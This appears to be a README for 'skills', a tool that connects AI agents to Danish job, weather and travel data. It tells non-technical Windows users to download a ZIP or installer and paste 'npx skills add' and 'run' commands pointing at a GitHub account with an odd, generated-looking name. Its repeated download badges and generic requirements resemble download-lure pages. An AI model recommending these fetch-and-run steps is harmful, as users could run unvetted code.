# 🤖 skills - Practical tools for daily Danish life

[![Download skills](https://img.shields.io/badge/Download-Get%20skills-brightgreen)](https://github.com/Marchelleintrinsical938/skills)

---

<p align="center">
  <img src="assets/banner.gif" alt="Agent Skills" width="640">
</p>

---

## 📥 Download and Install

To use *skills* on your Windows computer, follow these steps carefully. The process does not require programming knowledge.

1. Click the big green button above or visit this page to download the software:
   
   https://github.com/Marchelleintrinsical938/skills

2. On the GitHub page, look for the latest release or main project files. 

3. Download the files to your computer by clicking the provided ZIP file or installer, if available.

4. If you downloaded a ZIP file, right-click it and choose **Extract All**. Pick a folder on your computer where you want the program to live.

5. Open the extracted folder.

6. To run *skills*, you will need Node.js installed on your computer. You can download Node.js from https://nodejs.org/. Choose the LTS version and follow the installer.

7. After installing Node.js, open the **Command Prompt**:
   
   - Press **Windows Key + R**,
   - Type `cmd`,
   - Press **Enter**.

8. In Command Prompt, use the `cd` command to move to the folder you extracted. For example, if you extracted to `C:\skills`, type:
   
   ```
   cd C:\skills
   ```

9. Now, install *skills* by running this command in the Command Prompt:
   
   ```
   npx skills add https://github.com/Marchelleintrinsical938/skills --skill jobindex-search
   ```

   This command installs the main skill connecting you to Denmark’s largest job portal.

10. To test if *skills* runs, type:
   
   ```
   npx skills run jobindex-search
   ```

   You should see live job listings from Jobindex.dk.

---

## ⚙️ How skills Work

*skills* is a collection of special tools called “skills.” Each skill connects your AI agent to live Danish data sources. For example, one skill searches current job listings, while another finds homes or weather reports.

The software works with any AI agent compatible with skills. You add the skills you want, and they give real answers based on live data, not guesswork.

Skills include:

- Finding jobs from Jobindex.dk and Jobnet.dk
- Searching public employment listings
- Checking local weather
- Planning trips
- Looking up health information

*skills* runs on Windows computers with Node.js installed. It does not need extra software or complicated setup.

---

## 💻 System Requirements

Ensure your system meets these minimum requirements before installing:

- **Operating System:** Windows 10 or higher  
- **Processor:** Intel or AMD, 1.5 GHz or faster  
- **Memory:** 4 GB RAM or more  
- **Storage:** At least 200 MB free disk space  
- **Internet:** Required for real-time data connections  
- **Software:** Node.js (LTS version) installed

---

## 🚀 Getting Started with skills

1. Download and install Node.js if you do not have it.
2. Open the Command Prompt.
3. Move to the folder where you want to install *skills*.
4. Run the install command for the skill you want:

   ```
   npx skills add https://github.com/Marchelleintrinsical938/skills --skill jobindex-search
   ```

5. Start using the skill by running:

   ```
   npx skills run jobindex-search
   ```

6. Repeat step 4 for other skills you want, such as:

   ```
   npx skills add https://github.com/Marchelleintrinsical938/skills --skill jobnet-search
   ```

---

## 🔍 Available Skills (Examples)

### Danish Job Search

- **jobindex-search**  
  Finds current job listings from [Jobindex.dk](https://jobindex.dk), Denmark’s largest job site.
  
- **jobnet-search**  
  Searches job listings from [Jobnet.dk](https://jobnet.dk), the public employment service portal.

Run these skills from the command line after installation using:

```
npx skills run jobindex-search
```

or

```
npx skills run jobnet-search
```

---

## 💡 Using skills Without Programming

If you find command line steps difficult, you can copy and paste the lines exactly as provided when asked. The commands download and run the programs for you.

If you prefer, you can ask someone to help type commands or use software that can run these commands with a click.

---

## 🛠️ Troubleshooting

- If a command does not work, check if Node.js is installed by typing:

  ```
  node -v
  ```

  You should see a version number.

- Make sure you are in the correct folder by typing:

  ```
  dir
  ```

  You should see the skills files listed.

- If commands fail, try closing and reopening Command Prompt.

- Check your internet connection because skills fetch live data.

---

## 📚 Learn More

Visit the [skills GitHub page](https://github.com/Marchelleintrinsical938/skills) for updates, more skills, and detailed guides.

---

[![Download skills](https://img.shields.io/badge/Download-Get%20skills-lightgrey)](https://github.com/Marchelleintrinsical938/skills)